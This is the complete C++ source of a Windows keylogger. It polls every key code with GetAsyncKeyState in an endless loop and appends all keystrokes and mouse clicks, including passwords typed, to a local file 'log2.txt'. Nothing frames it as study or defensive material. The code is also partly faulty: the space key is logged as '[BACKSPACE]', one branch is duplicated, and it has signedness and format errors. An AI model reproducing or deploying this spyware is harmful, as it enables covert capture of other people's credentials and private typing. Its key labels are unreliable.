#include <iostream>
#include <Windows.h>

using namespace std;

//Key which are needed to be logged
int Save(int _key, char *file);

int main()
{  
    char i;
    while(true)
    {
        for(i=8; i<= 255; i++)//for ASCII values
        {
            if(GetAsyncKeyState(i) == -32767)// -32767 means that a button has been pressed
            {
                Save(i, "log2.txt");
            }

        }
    }
}

int Save(int _key, char *file)
{
    cout<< _key <<endl;

    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen( file, "a+");// a+ to add new keys everytime it is pressed
    if(_key== VK_SHIFT)
    fprintf(OUTPUT_FILE,"%s","[SHIFT]");
    else if(_key== VK_BACK)
    fprintf(OUTPUT_FILE,"%s","[BACK]");
    else if(_key== VK_LBUTTON)
    fprintf(OUTPUT_FILE,"%s","[mouseLclick]");
    else if(_key== VK_RETURN)
    fprintf(OUTPUT_FILE,"%s","[ENTER]");
    else if(_key== VK_ESCAPE)
    fprintf(OUTPUT_FILE,"%s","[ESCAPE]");
    else if(_key== VK_SHIFT)
    fprintf(OUTPUT_FILE,"%s","[SHIFT]");
    else if(_key== VK_RBUTTON)
    fprintf(OUTPUT_FILE,"%s","[mouseRclick]");
    else if(_key== VK_CAPITAL)
    fprintf(OUTPUT_FILE,"%s","[CAPSLOCK]");
    else if(_key== VK_TAB)
    fprintf(OUTPUT_FILE,"%s","[TAB]");
    else if(_key== VK_CONTROL)
    fprintf(OUTPUT_FILE,"%s","[CONTROL]");
    else if(_key== VK_MENU)
    fprintf(OUTPUT_FILE,"%s","[ALT]");
    else if(_key== VK_SPACE)
    fprintf(OUTPUT_FILE,"%s","[BACKSPACE]");
    else if(_key== VK_PRIOR)
    fprintf(OUTPUT_FILE,"%s","[PAGEUP]");
    else if(_key== VK_NEXT)
    fprintf(OUTPUT_FILE,"%s","[PAGEDOWN]");
    else if(_key== VK_END)
    fprintf(OUTPUT_FILE,"%s","[END]");
    else if(_key== VK_HOME)
    fprintf(OUTPUT_FILE,"%s","[HOME]");
    else if(_key== VK_LEFT)
    fprintf(OUTPUT_FILE,"%s","[LEFTKEY]");
    else if(_key== VK_RIGHT)
    fprintf(OUTPUT_FILE,"%s","[RIGHTKEY]");
    else if(_key== VK_UP)
    fprintf(OUTPUT_FILE,"%s","[UPKEY]");
    else if(_key== VK_DOWN)
    fprintf(OUTPUT_FILE,"%s","[DOWNKEY]");
    else if(_key== VK_PRINT)
    fprintf(OUTPUT_FILE,"%s","[PRINT]");
    else if(_key== VK_SNAPSHOT)
    fprintf(OUTPUT_FILE,"%s","[PRINTSCREEN]");
    else if(_key== VK_INSERT)
    fprintf(OUTPUT_FILE,"%s","[INSERTKEY]");
    else if(_key== VK_DELETE)
    fprintf(OUTPUT_FILE,"%s","[DELETE]");
    else if(_key== VK_LWIN)
    fprintf(OUTPUT_FILE,"%s","[WINDOWS]");
	else if(_key== VK_MULTIPLY)
    fprintf(OUTPUT_FILE,"%s","*");
    else if(_key== VK_ADD)
    fprintf(OUTPUT_FILE,"%s","+");
    else if(_key== VK_SUBTRACT)
    fprintf(OUTPUT_FILE,"%s","-");
    else if(_key== VK_DIVIDE)
    fprintf(OUTPUT_FILE,"%s","/");
    else if(_key== VK_DECIMAL)
    fprintf(OUTPUT_FILE,"%s",".");
	else
    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);
}